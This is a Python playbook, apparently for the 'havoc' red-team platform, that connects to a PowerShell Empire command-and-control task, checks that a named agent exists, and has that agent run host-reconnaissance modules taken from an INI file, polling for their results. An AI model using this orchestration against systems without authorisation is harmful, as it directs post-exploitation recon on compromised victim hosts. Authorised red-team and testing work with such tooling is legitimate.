# Import the supporting Python packages.
import os
import string
import random
import pprint
import time as t
import argparse
from configparser import ConfigParser

# Import the havoc Python package.
import havoc

init_parser = argparse.ArgumentParser(description='havoc playbook - PowerShell Empire Builtin Host Recon')

init_parser.add_argument('--profile', help='Use a specific profile from your credential file')
init_args = init_parser.parse_args()

profile = init_args.profile

# Load the ./HAVOC configuration file
havoc_config = ConfigParser()
havoc_config_file = os.path.expanduser('~/.havoc/config')
havoc_config.read(havoc_config_file)

# Get api_key and secret_key
if profile:
    api_key = havoc_config.get(profile, 'API_KEY')
    secret = havoc_config.get(profile, 'SECRET')
    api_region = havoc_config.get(profile, 'API_REGION')
    api_domain_name = havoc_config.get(profile, 'API_DOMAIN_NAME')
else:
    api_key = havoc_config.get('default', 'API_KEY')
    secret = havoc_config.get('default', 'SECRET')
    api_region = havoc_config.get('default', 'API_REGION')
    api_domain_name = havoc_config.get('default', 'API_DOMAIN_NAME')

h = havoc.Connect(api_region, api_domain_name, api_key, secret)

# Configure pretty print for displaying output.
pp = pprint.PrettyPrinter(indent=4)

# Create a config parser and setup config parameters
config = ConfigParser(allow_no_value=True)
config.optionxform = str
config.read('havoc-playbooks/pse_host_recon/pse_host_recon.ini')

c2_task_name = config.get('c2_task', 'task_name')
c2_agent_name = config.get('c2_task', 'agent_name')

# Verify c2_task exists
print(f'\nVerifying that powershell_empire task {c2_task_name} exists.')
c2_task = h.verify_task(c2_task_name, 'powershell_empire')
if c2_task:
    print(f'C2 task {c2_task_name} found.')
else:
    exit(f'No powershell_empire task with name {c2_task_name} found. Exiting...')

# Verify that the C2 agent exists.
print(f'\nVerifying that agent {c2_agent_name} exists.')
c2_instruct_instance = ''.join(random.choice(string.ascii_letters) for i in range(6))
c2_instruct_command = 'get_agents'
c2_instruct_args = {'Name': c2_agent_name}
agents_list = h.interact_with_task(c2_task_name, c2_instruct_command, c2_instruct_instance, c2_instruct_args)
agent_exists = False
for agent in agents_list['agents']:
    if c2_agent_name == agent['name']:
        agent_exists = True
if agent_exists:
    print(f'Agent {c2_agent_name} exists. Continuing...\n')
else:
    print(f'Agent {c2_agent_name} not found. Exiting...\n')

def execute_module(executing_module, module_config):
    # Use a random string for the agent instruct_instance of each shell command.
    module_instruct_instance = ''.join(random.choice(string.ascii_letters) for i in range(6))
    instruct_command = 'execute_module'
    instruct_args = {'Agent': c2_agent_name, 'Name': executing_module}
    for k, v in module_config.items():
        if v:
            instruct_args[k] = v
    module_response = h.interact_with_task(c2_task_name, instruct_command, module_instruct_instance, instruct_args)
    if module_response['outcome'] == 'success':
        print(f'{executing_module} succeeded.\n')
        module_task_id = module_response['message']['taskID']
    else:
        print(f'{instruct_command} failed with response:\n')
        print(module_response)
        module_task_id = None
    return module_instruct_instance, module_task_id

def get_module_results(executing_module, module_instruct_instance, module_task_id):
    print(f'\nGetting results from execute_module "{executing_module}"\n')
    results = None
    while not results:
        try:
            instruct_command = 'get_shell_command_results'
            instruct_args = {'Name': c2_agent_name}
            module_results = h.interact_with_task(c2_task_name, instruct_command, module_instruct_instance, instruct_args)
            if module_results['outcome'] == 'success':
                for module_result in module_results['results']:
                    if 'taskID' in module_result and module_result['taskID'] == module_task_id:
                        if module_result['results'] and module_result['results'] is not None:
                            results = module_result['results']
            else:
                results = f'{instruct_command} failed.\n'
            if not results:
                t.sleep(10)
        except KeyboardInterrupt:
            exit('get_shell_command_results interrupted. Exiting...')
    print(f'{executing_module} results:')
    print(results)

# Execute the modules.
for section in config.sections():
    if section != 'c2_task':
        module_config = dict(config.items(section))
        if module_config['Enable'].lower() == 'true':
            module = module_config['Module']
            del module_config['Module']
            print(f'\nTasking agent with execute_module "{module}"\n')
            instruct_instance, task_id = execute_module(module, module_config)
            if task_id is not None:
                get_module_results(module, instruct_instance, task_id)

# Wait for the powershell_empire task to become idle.
print(f'\nWaiting for powershell_empire task {c2_task_name} to become idle.')
try:
    h.wait_for_idle_task(c2_task_name)
except KeyboardInterrupt:
    exit('Interrupting wait_for_idle_task. Exiting...')
print(f'{c2_task_name} is now idle.')

# Playbook is complete.
exit('\nPlaybook operation completed. Exiting...')
